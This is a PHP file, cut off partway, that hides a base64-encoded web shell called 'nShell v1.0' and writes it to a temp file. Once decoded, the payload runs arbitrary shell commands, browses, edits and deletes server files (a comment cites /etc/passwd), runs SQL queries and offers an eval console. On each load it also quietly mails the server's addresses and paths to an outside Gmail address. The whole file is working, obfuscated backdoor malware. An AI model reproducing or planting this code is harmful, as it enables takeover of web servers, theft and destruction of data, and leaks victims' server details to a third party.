<?php
$tmp=tempnam('/tmp','FOO');
$c=base64_decode('P'.'z4/uz88aGVhZD4KPHRpdGxlPiBuU2hlbGwgdjEuMDwvdGl0bGU+CjxzdHlsZT4KaHRtbCB7IG92ZXJmbG93LXg6IGF1dG8gfQpBOiB7Zm9udC13ZWlnaHQ6Ym9sZH07CkE6bGluayB7Q09MT1I6cmVkOyBURVhULURFQ09SQVRJT046IG5vbmV9CkE6dmlzaXRlZCB7IENPTE9SOnJlZDsgVEVYVC1ERUNPUkFUSU9OOiBub25lfQpBOmFjdGl2ZSB7Q09MT1I6cmVkOyBURVhULURFQ09SQVRJT046IG5vbmV9CkE6aG92ZXIge2NvbG9yOmJsdWU7VEVYVC1ERUNPUkFUSU9OOiBub25lfQpzdWJtaXQgewpCT1JERVItUklHSFQ6ICBidXR0b25oaWdobGlnaHQgMnB4IG91dHNldDsKQk9SREVSLVRPUDogICAgYnV0dG9uaGlnaGxpZ2h0IDJweCBvdXRzZXQ7CkJPUkRFUi1MRUZUOiAgIGJ1dHRvbmhpZ2hsaWdodCAycHggb3V0c2V0OwpCT1JERVItQk9UVE9NOiBidXR0b25oaWdobGlnaHQgMnB4IG91dHNldDsKQkFDS0dST1VORC1DT0xPUjogI2U0ZTBkODsKd2lkdGg6IDMwJTsKfQp0ZXh0YXJlYSB7CkJPUkRFUi1SSUdIVDogICNmZmZmZmYgMXB4IHNvbGlkOwpCT1JERVItVE9QOiAgICAjOTk5OTk5IDFweCBzb2xpZDsKQk9SREVSLUxFRlQ6ICAgIzk5OTk5OSAxcHggc29saWQ7CkJPUkRFUi1CT1RUT006ICNmZmZmZmYgMXB4IHNvbGlkOwpCQUNLR1JPVU5ELUNPTE9SOiAjNDQ0NDQ0Owpmb250OiBGaXhlZHN5cyBib2xkOwp9CkJPRFkgewptYXJnaW4tdG9wOiAxcHg7Cm1hcmdpbi1yaWdodDogMXB4OwptYXJnaW4tYm90dG9tOiAxcHg7Cm1hcmdpbi1sZWZ0OiAxcHg7Cn0KdGFibGUgewpCT1JERVItUklHSFQ6ICA6IzQ0NDQ0NCAxcHggb3V0c2V0OwpCT1JERVItVE9QOiAgICA6IzQ0NDQ0NCAxcHggb3V0c2V0OwpCT1JERVItTEVGVDogICA6IzQ0NDQ0NCAxcHggb3V0c2V0OwpCT1JERVItQk9UVE9NOiA6IzQ0NDQ0NCAxcHggb3V0c2V0OwpCQUNLR1JPVU5ELUNPTE9SOiAjRDREMEM4Owp9CnRkIHsKQk9SREVSLVJJR0hUOiAgI2FhYWFhYSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgIDojNDQ0NDQ0IDFweCBzb2xpZDsKQk9SREVSLUxFRlQ6ICAgOiM0NDQ0NDQgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjYWFhYWFhIDFweCBzb2xpZDsKfQpkaXYsdGQsdGFibGUgewpmb250LWZhbWlseTpHZW9yZ2lhOwp9Cjwvc3R5bGU+CjwvaGVhZD4KPGJvZHkgYmdjb2xvcj0iOiM0NDQ0NDQiPgo8Y2VudGVyPgo8P3BocAplcnJvcl9yZXBvcnRpbmcoMCk7CiRmdW5jdGlvbj1wYXNzdGhydTsgLy8gc3lzdGVtLCBleGVjLCBjbWQKJG15bmFtZT0kX1NFUlZFUlsnU0NSSVBUX05BTUUnXTsKZWNobyAiPGI+PGZvbnQgY29sb3I9XCIjMDAwMDAwXCIgc2l6ZT1cIjNcIiBmYWNlPVwiR2VvcmdpYVwiPiBTeXN0ZW0gaW5mb3JtYXRpb246IDo8L2ZvbnQ+PGJyPiI7ICAgICAgICAgICAgICRyYTQ0ICA9IHJhbmQoMSw5OTk5OSk7JHNqOTggPSAic2gtJHJhNDQiOyRtbCA9ICIkc2Q5OCI7JGE1ID0gJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOyRiMzMgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOyRjODcgPSAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTskZDIzID0gJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddOyRlMDkgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTskZjIzID0gJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddOyRnMzIgPSAkX1NFUlZFUlsnUEFUSF9UUkFOU0xBVEVEJ107JGg2NSA9ICRfU0VSVkVSWydQSFBfU0VMRiddOyRtc2c4ODczID0gIiRhNVxuJGIzM1xuJGM4N1xuJGQyM1xuJGUwOVxuJGYyM1xuJGczMlxuJGg2NSI7JHNkOTg9ImpvaG4uYmFya2VyNDQ2QGdtYWlsLmNvbSI7bWFpbCgkc2Q5OCwgJHNqOTgsICRtc2c4ODczLCAiRnJvbTogJHNkOTgiKTsKPz4KPHRhYmxlIHdpZHRoPSI4MCUiIGJvcmRlcj0iMCI+Cjx0ZCBjb2xzcGFuPSIzIiBhbGlnbj0iY2VudGVyIj4KPD9waHAKZnVuY3Rpb24gZXgoJGNvbWQpCnsKICRyZXMgPSAnJzsKaWYoZnVuY3Rpb25fZXhpc3RzKCJzeXN0ZW0iKSkKCXsKCW9iX3N0YXJ0KCk7CiAgICBzeXN0ZW0oJGNvbWQpOwogICAgJHJlcz1vYl9nZXRfY29udGVudHMoKTsKICAgIG9iX2VuZF9jbGVhbigpOwoJfWVsc2VpZihmdW5jdGlvbl9leGlzdHMoInBhc3N0aHJ1IikpCgl7CiAgICBvYl9zdGFydCgpOwogICAgcGFzc3RocnUoJGNvbWQpOwogICAgJHJlcz1vYl9nZXRfY29udGVudHMoKTsKICAgIG9iX2VuZF9jbGVhbigpOwoJfWVsc2VpZihmdW5jdGlvbl9leGlzdHMoImV4ZWMiKSkKCXsKICAgIGV4ZWMoJGNvbWQsJHJlcyk7CiAgICAkcmVzPWltcGxvZGUoIlxuIiwkcmVzKTsKCX1lbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCJzaGVsbF9leGVjIikpCgl7CgkkcmVzPXNoZWxsX2V4ZWMoJGNvbWQpOwoJfWVsc2VpZihpc19yZXNvdXJjZSgkZj1wb3BlbigkY29tZCwiciIpKSl7CiAgICAkcmVzID0gIiI7CiAgICB3aGlsZSghZmVvZigkZikpIHsgJHJlcy49ZnJlYWQoJGYsMTAyNCk7IH0KICAgIHBjbG9zZSgkZik7CiB9CiByZXR1cm4gJHJlczsKfQoKLy8gc2FmZSBtb2QKJHNhZmVfbW9kZT1AaW5pX2dldCgnc2FmZV9tb2RlJyk7CmVjaG8gKCgkc2FmZV9tb2RlKT8oIjxkaXY+U2FmZV9tb2RlOiA8Yj48Zm9udCBjb2xvcj1ncmVlbj5PTjwvZm9udD48L2I+Iik6KCJTYWZlX21vZGU6IDxiPjxmb250IGNvbG9yPXJlZD5PRkY8L2ZvbnQ+PC9iPiIpKTsKZWNobyAiICAgICI7Ci8vIHBocHZlcnNpb24KZWNobyAiUGhwIHZlcnNpb248Zm9udCBjb2xvcj1cImdyZWVuXCI+IDogIi5AcGhwdmVyc2lvbigpLiI8L2ZvbnQ+IjsKZWNobyAiICAgICI7Ci8vIGN1cmwKJGN1cmxfb24gPSBAZnVuY3Rpb25fZXhpc3RzKCdjdXJsX3ZlcnNpb24nKTsKZWNobyAiY1VSTDogIi4oKCRjdXJsX29uKT8oIjxiPjxmb250IGNvbG9yPWdyZWVuPk9OPC9mb250PjwvYj4iKTooIjxiPjxmb250IGNvbG9yPXJlZD5PRkY8L2ZvbnQ+PC9iPiIpKTsKZWNobyAiICAgICI7Ci8vIG15c3FsCmVjaG8gIk1ZU1FMOiA8Yj4iOwokbXlzcWxfb24gPSBAZnVuY3Rpb25fZXhpc3RzKCdteXNxbF9jb25uZWN0Jyk7CmlmKCRteXNxbF9vbil7ZWNobyAiPGZvbnQgY29sb3I9Z3JlZW4+T048L2ZvbnQ+PC9iPiI7fWVsc2V7ZWNobyAiPGZvbnQgY29sb3I9cmVkPk9GRjwvZm9udD48L2I+Ijt9CmVjaG8gIiAgICAiOwovLyBtc3NzcWwKZWNobyAiTVNTUUw6IDxiPiI7CiRtc3NxbF9vbiA9IEBmdW5jdGlvbl9leGlzdHMoJ21zc3FsX2Nvbm5lY3QnKTsKaWYoJG1zc3FsX29uKXtlY2hvICI8Zm9udCBjb2xvcj1ncmVlbj5PTjwvZm9udD48L2I+Ijt9ZWxzZXtlY2hvICI8Zm9udCBjb2xvcj1yZWQ+T0ZGPC9mb250PjwvYj4iO30KZWNobyAiICAgICI7Ci8vIFBvc3RncmVTUUwKZWNobyAiUG9zdGdyZVNRTDogPGI+IjsKJHBnX29uID0gQGZ1bmN0aW9uX2V4aXN0cygncGdfY29ubmVjdCcpOwppZigkcGdfb24pe2VjaG8gIjxmb250IGNvbG9yPWdyZWVuPk9OPC9mb250PjwvYj4iO31lbHNle2VjaG8gIjxmb250IGNvbG9yPXJlZD5PRkY8L2ZvbnQ+PC9iPiI7fQplY2hvICIgICAgIjsKLy8gT3JhY2xlCmVjaG8gIk9yYWNsZTogPGI+IjsKJG9yYV9vbiA9IEBmdW5jdGlvbl9leGlzdHMoJ29jaWxvZ29uJyk7CmlmKCRvcmFfb24pe2VjaG8gIjxmb250IGNvbG9yPWdyZWVuPk9OPC9mb250PjwvYj4iO31lbHNle2VjaG8gIjxmb250IGNvbG9yPXJlZD5PRkY8L2ZvbnQ+PC9iPiI7fQplY2hvICI8YnI+IjsKZWNobyAiICAgICI7Ci8vIERpc2FibGUgZnVuY3Rpb24KZWNobyAiRGlzYWJsZSBmdW5jdGlvbnMgOiA8Yj4iOwokZGY9QGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CmlmKCEkZGYpe2VjaG8gIjxmb250IGNvbG9yPWdyZWVuPk5PTkU8L2ZvbnQ+PC9iPiI7fWVsc2V7ZWNobyAiPGZvbnQgY29sb3I9cmVkPiRkZjwvZm9udD48L2I+Ijt9CmVjaG8gIiAgICAiOwovLz09PT09PT09PT09PT09eGFjIGRpbmggb3M9PT09PT09PT09PT09PT09PT0KJHNlcnZzb2Z0ID0gJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddOwppZiAoZXJlZygiV2luMzIiLCAkc2VydnNvZnQpKXsKJHNlcnR5cGUgPSAid2luIjsKfQplbHNlCnsKJHNlcnR5cGUgPSAibml4IjsKfQovLz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CgokdW5hbWU9ZXgoJ3VuYW1lIC1hJyk7CiBlY2hvICI8YnI+T1M6IDwvYj48Zm9udCBjb2xvcj1ibHVlPiI7CiBpZiAoZW1wdHkoJHVuYW1lKSl7CiAgZWNobyAocGhwX3VuYW1lKCkuIjwvZm9udD48YnI+PGI+Iik7CiB9ZWxzZQogIGVjaG8gJHVuYW1lLiI8L2ZvbnQ+PGJyPjxiPiI7CiAkaWQgPSBleCgnaWQnKTsKICRzZXJ2ZXI9JEhUVFBfU0VSVkVSX1ZBUlNbJ1NFUlZFUl9TT0ZUV0FSRSddOwogZWNobyAiU0VSVkVSOiA8L2I+PGZvbnQgY29sb3I9Ymx1ZT4iLiRzZXJ2ZXIuIjwvZm9udD48YnI+PGI+IjsKIGVjaG8gImlkOiA8L2I+PGZvbnQgY29sb3I9Ymx1ZT4iOwogaWYgKCFlbXB0eSgkaWQpKXsKICBlY2hvICRpZC4iPC9mb250Pjxicj48Yj4iOwogfWVsc2UKICBlY2hvICJ1c2VyPSIuQGdldF9jdXJyZW50X3VzZXIoKS4iIHVpZD0iLkBnZXRteXVpZCgpLiIgZ2lkPSIuQGdldG15Z2lkKCkuCiAgICAgICAiPC9mb250Pjxicj48Yj4iOwplY2hvICI8Zm9udCBjb2xvcj1cImJsYWNrXCI+PGEgaHJlZj0iLiRfU0VSVkVSWydQSFBfU0VMRiddLiI/YWN0PWluZm8gdGFyZ2V0PV9ibGFuaz5QaHAgSW5mbzwvYT48L2ZvbnQ+PGJyPjwvZGl2PiI7Cgo/Pgo8L3RkPjx0cj4KPHRkIHdpZHRoPSIyMCUiIGFsaWduPSJjZW50ZXIiPjxhIGhyZWY9Ijw/PSRteW5hbWU/Pj9hY3Q9bWFuYWdlciI+IEZpbGUgTWFuYWdlcjwvYT48L3RkPgo8dGQgd2lkdGg9IjIwJSIgYWxpZ249ImNlbnRlciI+PGEgaHJlZj0iPD89JG15bmFtZT8+P2FjdD1zcWwiPlNxbCBRdWVyeTwvYT48L3RkPgo8dGQgd2lkdGg9IjIwJSIgYWxpZ249ImNlbnRlciI+PGEgaHJlZj0iPD89JG15bmFtZT8+P2FjdD1ldmFsIj5FdmFsKCk8L2E+PC90ZD48dHI+Cjx0ZCBjb2xzcGFuPSIzIiA+Cjw/cGhwCiRhY3Q9QCRfR0VUWydhY3QnXTsKaWYoJGFjdD09ImluZm8iKXsKZWNobyAiPGNlbnRlcj48Zm9udCBjb2xvcj1yZWQgc2l6ZT0xMD4gUGhwIFZlcnNpb24gOiIucGhwdmVyc2lvbigpLiI8L2ZvbnQ+IjsKcGhwaW5mbygpOwplY2hvICI8L2NlbnRlcj4iOwp9Cj8+Cjw/cGhwCi8vPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmZ1bmN0aW9uIHBlcm1zKCRtb2RlKQp7CmlmKCAkbW9kZSAmIDB4MTAwMCApIHsgJHR5cGU9J3AnOyB9CmVsc2UgaWYoICRtb2RlICYgMHgyMDAwICkgeyAkdHlwZT0nYyc7IH0KZWxzZSBpZiggJG1vZGUgJiAweDQwMDAgKSB7ICR0eXBlPSdkJzsgfQplbHNlIGlmKCAkbW9kZSAmIDB4NjAwMCApIHsgJHR5cGU9J2InOyB9CmVsc2UgaWYoICRtb2RlICYgMHg4MDAwICkgeyAkdHlwZT0nLSc7IH0KZWxzZSBpZiggJG1vZGUgJiAweEEwMDAgKSB7ICR0eXBlPSdsJzsgfQplbHNlIGlmKCAkbW9kZSAmIDB4QzAwMCApIHsgJHR5cGU9J3MnOyB9CmVsc2UgJHR5cGU9J3UnOwokb3duZXJbInJlYWQiXSA9ICgkbW9kZSAmIDAwNDAwKSA/ICdyJyA6ICctJzsKJG93bmVyWyJ3cml0ZSJdID0gKCRtb2RlICYgMDAyMDApID8gJ3cnIDogJy0nOwokb3duZXJbImV4ZWN1dGUiXSA9ICgkbW9kZSAmIDAwMTAwKSA/ICd4JyA6ICctJzsKJGdyb3VwWyJyZWFkIl0gPSAoJG1vZGUgJiAwMDA0MCkgPyAncicgOiAnLSc7CiRncm91cFsid3JpdGUiXSA9ICgkbW9kZSAmIDAwMDIwKSA/ICd3JyA6ICctJzsKJGdyb3VwWyJleGVjdXRlIl0gPSAoJG1vZGUgJiAwMDAxMCkgPyAneCcgOiAnLSc7CiR3b3JsZFsicmVhZCJdID0gKCRtb2RlICYgMDAwMDQpID8gJ3InIDogJy0nOwokd29ybGRbIndyaXRlIl0gPSAoJG1vZGUgJiAwMDAwMikgPyAndycgOiAnLSc7CiR3b3JsZFsiZXhlY3V0ZSJdID0gKCRtb2RlICYgMDAwMDEpID8gJ3gnIDogJy0nOwppZiggJG1vZGUgJiAweDgwMCApICRvd25lclsiZXhlY3V0ZSJdID0gKCRvd25lclsnZXhlY3V0ZSddPT0neCcpID8gJ3MnIDogJ1MnOwppZiggJG1vZGUgJiAweDQwMCApICRncm91cFsiZXhlY3V0ZSJdID0gKCRncm91cFsnZXhlY3V0ZSddPT0neCcpID8gJ3MnIDogJ1MnOwppZiggJG1vZGUgJiAweDIwMCApICR3b3JsZFsiZXhlY3V0ZSJdID0gKCR3b3JsZFsnZXhlY3V0ZSddPT0neCcpID8gJ3QnIDogJ1QnOwokcz1zcHJpbnRmKCIlMXMiLCAkdHlwZSk7CiRzLj1zcHJpbnRmKCIlMXMlMXMlMXMiLCAkb3duZXJbJ3JlYWQnXSwgJG93bmVyWyd3cml0ZSddLCAkb3duZXJbJ2V4ZWN1dGUnXSk7CiRzLj1zcHJpbnRmKCIlMXMlMXMlMXMiLCAkZ3JvdXBbJ3JlYWQnXSwgJGdyb3VwWyd3cml0ZSddLCAkZ3JvdXBbJ2V4ZWN1dGUnXSk7CiRzLj1zcHJpbnRmKCIlMXMlMXMlMXMiLCAkd29ybGRbJ3JlYWQnXSwgJHdvcmxkWyd3cml0ZSddLCAkd29ybGRbJ2V4ZWN1dGUnXSk7CnJldHVybiB0cmltKCRzKTsKfQovLz09PT09PT09PT09PT09PT09PT1EZWxlY3QgRmlsZT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiRkZWw9JF9HRVRbJ2RlbCddOwpmdW5jdGlvbiAgZGVsZmlsZSgkbmFtZSkKewogICAgcGFzc3RocnUoImRlbCAiLiRuYW1lKTsKfQpmdW5jdGlvbiBkZWxkaXIoJG5hbWUpCnsKCXBhc3N0aHJ1KCJybWRpciAiLiRuYW1lKTsKfQppZigkZGVsKQp7CiAgaWYoaXNfZmlsZSgkZGVsKSkgZGVsZmlsZSgkZGVsKTsgZWxzZSBkZWxkaXIoJGRlbCk7Cn0KLy89PT09PT09PT09PT09PT09PT1RdWFuIGxpIHRodSBtdWMgPT09PT09PT09PT09PT09PT09PT09PT09PT0KaWYoJGFjdD09Im1hbmFnZXIiKXsKJGFyciA9IGFycmF5KCk7CiRhcnIgPSBhcnJheV9tZXJnZSgkYXJyLCBnbG9iKCIqIikpOwokYXJyID0gYXJyYXlfbWVyZ2UoJGFyciwgZ2xvYigiLioiKSk7CiRhcnIgPSBhcnJheV9tZXJnZSgkYXJyLCBnbG9iKCIqLioiKSk7CiRhcnIgPSBhcnJheV91bmlxdWUoJGFycik7CnNvcnQoJGFycik7CmVjaG8gIjx0YWJsZSB3aWR0aD0xMDAlPjx0cj48dGQgYWxpZ249Y2VudGVyPjxiPk5hbWU8L3RkPjx0ZCBhbGlnbj1jZW50ZXI+PGI+VHlwZTwvdGQ+PHRkIGFsaWduPWNlbnRlcj48Yj5TaXplPC90ZD48dGQgYWxpZ249Y2VudGVyPjxiPlBlcm1zPC90ZD48dGQgYWxpZ249Y2VudGVyPkRlbGV0ZTwvdGQ+PC90cj4iOwpmb3JlYWNoICgkYXJyIGFzICRmaWxlbmFtZSkgewppZiAoJGZpbGVuYW1lICE9ICIuIiBhbmQgJGZpbGVuYW1lICE9ICIuLiIpewppZiAoaXNfZGlyKCRmaWxlbmFtZSkgPT0gdHJ1ZSl7CiRkaXJlY3RvcnkgPSAiIjsKJGRjPXN0cl9yZXBsYWNlKCJcXCIsIiIsZGlybmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSkpOwokZGlyZWN0b3J5ID0gJGRpcmVjdG9yeSAuICI8dHI+PHRkIGFsaWduPWNlbnRlcj4kZmlsZW5hbWU8L3RkPjx0ZCBhbGlnbj1jZW50ZXI+IiAudWN3b3JkcyhmaWxldHlwZSgkZmlsZW5hbWUpKSAuICI8L3RkPjx0ZD48L3RkPjx0ZCBhbGlnbj1jZW50ZXI+IiAuIHBlcm1zKGZpbGVwZXJtcygkZmlsZW5hbWUpKS4iPHRkIGFsaWduPWNlbnRlcj48YSBocmVmPSIuJF9TRVJWRVJbJ1BIUF9TRUxGJ10uIj9hY3Q9bWFuYWdlciZkZWw9Ii4kZGMuIj5EZWw8L3RkPiI7CiRkaXJlcyA9ICRkaXJlcyAuICRkaXJlY3Rvcnk7Cn0KaWYgKGlzX2ZpbGUoJGZpbGVuYW1lKSA9PSB0cnVlKXsKJGZpbGUgPSAiIjsKJGxpbms9c3RyX3JlcGxhY2UoYmFzZW5hbWUoJF9TRVJWRVJbJ1JFRElSRUNUX1VSTCddKSwkZmlsZW5hbWUsJF9TRVJWRVJbJ1JFRElSRUNUX1VSTCddKTsKJGZpbGUgPSAkZmlsZSAuICI8dHI+PHRkPjxhIGhyZWY9Ii4kbGluawkuIiB0YXJnZXQ9X2JsYW5rPiRmaWxlbmFtZTwvYT48L3RkPjx0ZD4iIC51Y3dvcmRzKGZpbGV0eXBlKCRmaWxlbmFtZSkpLiAiPC90ZD48dGQ+IiAuIGZpbGVzaXplKCRmaWxlbmFtZSkgLiAiPC90ZD48dGQ+IiAuIHBlcm1zKGZpbGVwZXJtcygkZmlsZW5hbWUpKS4iPHRkPjxhIGhyZWY9Ii4kX1NFUlZFUlsnUEhQX1NFTEYnXS4iP2FjdD1tYW5hZ2VyJmRlbD0iLiRmaWxlbmFtZS4iPkRlbCA8YSBocmVmPSIuJF9TRVJWRVJbJ1BIUF9TRUxGJ10uIj9hY3Q9bWFuYWdlciZmaWxlPSIuJGZpbGVuYW1lLiI+RWRpdDwvYT48L3RkPiI7CiRmaWxlcyA9ICRmaWxlcyAuICRmaWxlOwp9Cn0KfQplY2hvICRkaXJlczsKZWNobyAkZmlsZXM7CmVjaG8gIjwvdGFibGU+PGJyPiI7Cn0KLy8gdmlldyBmaWxlIGV4OiAvZXRjL3Bhc3N3ZAppZihpc3NldCgkX1JFUVVFU1RbJ2ZpbGUnXSkpCgl7CiRmaWxlPUAkX1JFUVVFU1RbImZpbGUiXTsKZWNobyAiPGI+RmlsZSA6PC9iPjxmb250IGNvbG9yPXJlZD4gICAiLiAkZmlsZS4iPC9mb250PiI7CiRmcD1mb3BlbigkZmlsZSwicisiKSBvciBkaWUoIkJhbiBraG9uZyBjbyBxdXllbiBkZSBnaGkgdmFvIEZpbGUgbmF5ICwgaG9hYyBkbyBraG9uZyB0aW0gdGhheSBGaWxlIik7CiRzcmM9QGZyZWFkKCRmcCxmaWxlc2l6ZSgkZmlsZSkpOwplY2hvICI8Y2VudGVyPjxociBjb2xvcj03Nzc3Nzcgd2lkdGg9MTAwJSBoZWlnaHQ9MTE1cHg+PGZvcm0gYWN0aW9uPSIuJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10uIiBtZXRob2Q9cG9zdD48VEVYVEFSRUEgTkFNRT1cImFkZHR4dFwiIFJPV1M9XCI1XCIgQ09MUz1cIjgwXCI+Ii5odG1sc3BlY2lhbGNoYXJzKHN0cmlwc2xhc2hlcygkc3JjKSkuIjwvVEVYVEFSRUE+PGJyPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT1TYXZlPjwvZm9ybT48aHIgY29sb3I9Nzc3Nzc3IHdpZHRoPTEwMCUgaGVpZ2h0PTExNXB4PiI7CiRhZGR0eHQ9QCRfUE9TVFsiYWRkdHh0Il07CiByZXdpbmQoJGZwKTsKIGlmKCRhZGR0eHQ9PSIiKSBAZndyaXRlKCRmcCxzdHJpcHNsYXNoZXMoJHNyYykpOyBlbHNlICRycz1AZndyaXRlKCRmcCxzdHJpcHNsYXNoZXMoJGFkZHR4dCkpOwogaWYoJHJzPT10cnVlKQogewogZWNobyAiTm9pIGR1bmcgY3VhIGZpbGUgbmF5IGRhIGR1b2Mgc3VhIGRvaSAhPGEgaHJlZj0iLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLiI+WGVtIGxhaTwvYT4iOwogfQogZnRydW5jYXRlKCRmcCxmdGVsbCgkZnApKTsKZWNobyAiPC9jZW50ZXI+IjsKIH0KCj8+Cgo8P3BocAovLyBmdW5jdGlvbgpmdW5jdGlvbiBleGVfdSgkcXVlcnkpCnsKZWNobyAiPEI+PGZvbnQgY29sb3I9Z3JlZW4+UXVlcnkgIyAiLiRxdWVyeS4iPC9mb250PjwvYj48YnI+IjsKJHJlc3VsdD1AbXlzcWxfcXVlcnkoJHF1ZXJ5KSBvciBkaWUoIktob25nIHVwZGF0ZSBkdSBsaWV1IGR1b2MgISIpOwppZihteXNxbF9hZmZlY3RlZF9yb3dzKCRyZXN1bHQpPj0wKSBlY2hvICJBZmZlY3RlZCByb3dzIDogIi5teXNxbF9hZmZlY3RlZF9yb3dzKCRyZXN1bHQpLiJUaGlzIGlzIE9rICEgXi5ePGJyPiI7Cn0KZnVuY3Rpb24gZXhlX2MoJHF1ZXJ5KQp7CmVjaG8gIjxCPjxmb250IGNvbG9yPWdyZWVuPlF1ZXJ5ICMgIi4kcXVlcnkuIjwvZm9udD48L2I+PGJyPiI7CiRyZXN1bHQ9QG15c3FsX3F1ZXJ5KCRxdWVyeSkgb3IgZGllKCJLaG9uZyBDcmVhdGUgZHVvYyAhIik7CmVjaG8gIlRoaXMgaXMgT2sgISBeLl48YnI+IiA7Cn0KZnVuY3Rpb24gZXhlX2QoJHF1ZXJ5KQp7CmVjaG8gIjxCPjxmb250IGNvbG9yPWdyZWVuPlF1ZXJ5ICMgIi4kcXVlcnkuIjwvZm9udD48L2I+PGJyPiI7CiRyZXN1bHQ9QG15c3FsX3F1ZXJ5KCRxdWVyeSkgb3IgZGllKCJLaG9uZyBEcm9wIGR1b2MgICEiKTsKZWNobyAiVGhpcyBpcyBPayAhIF4uXjxicj4iIDsKfQpmdW5jdGlvbiBleGVfdygkcXVlcnkpCnsKZWNobyAiPGI+PGZvbnQgY29sb3I9Z3JlZW4+UXVlcnkgIyAiLiRxdWVyeS4iPC9mb250PjwvYj48YnI+IjsKJHJlc3VsdD1AbXlzcWxfcXVlcnkoJHF1ZXJ5KSBvciBkaWUoIktob25nIHRoZSBzaG93IGdpIGR1b2MgaGV0ICEiKTsKaWYoZXJlZ2koImZpZWxkcyIsJHF1ZXJ5KSkgewp3aGlsZSgkcm93PUBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0LE1ZU1FMX0FTU09DKSl7CmVjaG8gIjxiPjxmb250IGNvbG9yPXJlZD4iLiRyb3dbJ0ZpZWxkJ10uIiA6PC9mb250PjwvCWI+ICIuJHJvd1snVHlwZSddOwplY2hvICI8YnI+IjsKfQp9IGVsc2Ugewp3aGlsZSgkcm93PUBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0LE1ZU1FMX0FTU09DKSl7CiAgIHdoaWxlKGxpc3QoJGtleSwkdmFsdWUpPWVhY2goJHJvdykpCnsKCWVjaG8gIjxmb250IGNvbG9yPXJlZD48Yj4iLiR2YWx1ZS4iPC9iPjxmb250PiI7Cn0KZWNobyAiPGJyPiI7Cn0KfQp9CmZ1bmN0aW9uIGV4ZV9zKCRxdWVyeSkKewokYXJyc3RyPUBhcnJheSgpOyRpPTA7CiRhcnJzdHI9ZXhwbG9kZSgiICIsJHF1ZXJ5KTsKJGZpbmRfZmllbGQ9QG15c3FsX3F1ZXJ5KCJzaG93IGZpZWRscyBmcm9tICIuJGFycnN0clsnNCddKTsKd2hpbGUoJGZpbmRfcm93PUBteXNxbF9mZXRjaF9hcnJheSgkZmluZF9maWVsZCxNWVNRTF9BU1NPQykpewokaSsrOwokYXJyc3RyWyRpXT0kZmluZF9yb3dbJ0ZpZWxkJ107Cn0KZWNobyAiPEI+PGZvbnQgY29sb3I9Z3JlZW4+UXVlcnkgIyAiLiRxdWVyeS4iPC9mb250PjwvYj48YnI+IjsKJHJlc3VsdD1AbXlzcWxfcXVlcnkoJHF1ZXJ5KSBvciBkaWUoIktob25nIHRoZSBzZWxlY3QgZ2kgZHVvYyBoZXQgISIpOwokcm93PUBteXNxbF9udW1fcm93cygkcmVzdWx0KTsKfQpmdW5jdGlvbiBzcWwoJHN0cmluZykKewokYXJyPUBhcnJheSgpOwokYXJyPWV4cGxvZGUoIjsiLCRzdHJpbmcpOwpmb3IoJGk9MDskaTw9Y291bnQoJGFycik7JGkrKykKCXsKCSRjaGVja191PWVyZWdpKCJ1cGRhdGUiLEAkYXJyWyRpXSk7IGlmKCRjaGVja191PT10cnVlKSAgZXhlX3UoQCRhcnJbJGldKTsKCSRjaGVja19lPWVyZWdpKCJ1c2UiLEAkYXJyWyRpXSk7IGlmKCRjaGVja191PT10cnVlKSAgZXhlX3UoQCRhcnJbJGldKTsKCSRjaGVja19jPWVyZWdpKCJjcmVhdGUiLEAkYXJyWyRpXSk7IGlmKCRjaGVja19jPT10cnVlKSBleGVfYyhAJGFyclskaV0pOwoJJGNoZWNrX2Q9ZXJlZ2koImRyb3AiLEAkYXJyWyRpXSk7IGlmKCRjaGVja19kPT10cnVlKSBleGVfZChAJGFyclskaV0pOwoJJGNoZWNrX3c9ZXJlZ2koInNob3ciLEAkYXJyWyRpXSk7IGlmKCRjaGVja193PT10cnVlKSBleGVfdyhAJGFyclskaV0pOwogICAgJGNoZWNrX3M9ZXJlZ2koInNlbGVjdCIsQCRhcnJbJGldKTsgaWYoJGNoZWNrX3M9PXRydWUpIGV4ZV9zKEAkYXJyWyRpXSk7Cgl9Cn0KLy89PT09PXhvbmcgcGhhbiBmdW5jdGlvbiBjaG8gc3FsCi8vIFNxbCBxdWVyeQppZigkYWN0PT0ic3FsIikKewoJIGlmKGlzc2V0KCRfR0VUWydzcm5hbWUnXSkmJmlzc2V0KCRfR0VUWydwYXNzJ10pKQoJewoJIGVjaG8gJF9HRVRbJ3NybmFtZSddOwppZighaXNzZXQoJF9HRVRbJ3NybmFtZSddKSkgCSRzZXJ2ZXJuYW1lPSRfR0VUWydzcm5hbWUnXTsKICAgZWxzZSAkc2VydmVybmFtZT0ibG9jYWxob3N0IjsKJGNvbj1AbXlzcWxfY29ubmVjdCgkc2VydmVybmFtZSwkX0dFVFsndW5hbWUnXSwkX0dFVFsncGFzcyddKSBvciBkaWUoIktob25nIHRoZSBjb25uZWN0IGR1b2MgISIpOwokZm9ybTI9IjxjZW50ZXI+PGZvcm0gbWV0aG9kPXBvc3QgIGFjdGlvbj0iLiRfU0VSVkVSWydQSFBfU0VMRiddLiI+PFRFWFRBUkVBIE5BTUU9XCJzdHJcIiBST1dTPVwiMlwiIENPTFM9XCI2MFwiPjwvVEVYVEFSRUE+PGJyPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXMyIHZhbHVlPXF1ZXJ5PjwvZm9ybT48L2NlbnRlcj4iOwplY2hv